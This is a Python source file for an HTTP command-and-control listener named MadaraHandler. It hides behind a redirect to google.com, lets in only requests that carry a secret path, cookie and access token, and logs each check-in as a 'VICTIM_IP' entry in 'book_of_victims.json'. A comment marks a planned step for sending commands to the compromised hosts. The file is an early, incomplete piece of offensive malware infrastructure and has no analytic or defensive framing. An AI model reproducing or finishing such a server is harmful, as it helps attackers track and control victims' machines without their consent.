from http.server import HTTPServer, BaseHTTPRequestHandler
from http.cookies import SimpleCookie
import json
from datetime import datetime
from dotenv import load_dotenv
import os
# from cryptography


def get_env_info():
    load_dotenv()
    PATH = os.getenv("C_PATH")
    ACCESS_TOKEN = os.getenv("ACCESS_TOKEN")
    COOKIE_VALUE = os.getenv("COOKIE_VALUE")
    return PATH, ACCESS_TOKEN, COOKIE_VALUE

class MadaraHandler(BaseHTTPRequestHandler):

    def heart_beat(self):
        # Get the client IP and current time
        client_ip = self.client_address[0]
        connection_time = (datetime.now()).strftime("%Y-%m-%d %H:%M:%S")

        # Create a heartbeat dictionary
        beat = {"VICTIM_IP": client_ip, "TIME": connection_time}
        return beat

    def save_info(self, heart_beat):
        # Save the heartbeat to the JSON file
        try:
            with open("book_of_victims.json", "a") as j_file:
                json.dump(heart_beat, j_file, indent=4)
                j_file.write("\n")
        except Exception as e:
            print(f"An error occurred: {e}")


    def redirect(self, url, code=302):
        self.send_response(code)  # change later to 301 or 308
        self.send_header("Location", url)
        self.end_headers()

    def cookie_info(self):
        cookie_header = self.headers.get("Cookie")
        cookie = SimpleCookie(cookie_header)
        correct_cookie = cookie.get("name")
        return correct_cookie.value if correct_cookie else None

    def do_GET(self):
        PATH,ACCESS_TOKEN,COOKIE_VALUE = get_env_info()
        correct_cookie = self.cookie_info()

        if (
            self.path == PATH
            and correct_cookie == COOKIE_VALUE
            and self.headers["X-Access-Token"] == ACCESS_TOKEN
        ):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
        else:
             self.redirect("https://www.google.com")
    def do_POST(self):

        PATH,ACCESS_TOKEN,COOKIE_VALUE = get_env_info()
        correct_cookie = self.cookie_info()

        if (
            self.path == PATH
            and correct_cookie == COOKIE_VALUE
            and self.headers["X-Access-Token"] == ACCESS_TOKEN
        ):
            # Get the heartbeat info
            beat = self.heart_beat()

            # Save the heartbeat info
            self.save_info(beat)  # Pass the heartbeat dictionary to save_info
            self.send_response(200)

            # Collect commands from command program
            

        else:
            self.redirect("https://www.google.com")


def run(host="localhost", port=8080):
    server_info = (host, port)
    server = HTTPServer(server_info, MadaraHandler)
    print(f"Starting server on port {port}")
    server.serve_forever()

if __name__ == "__main__":
    run()

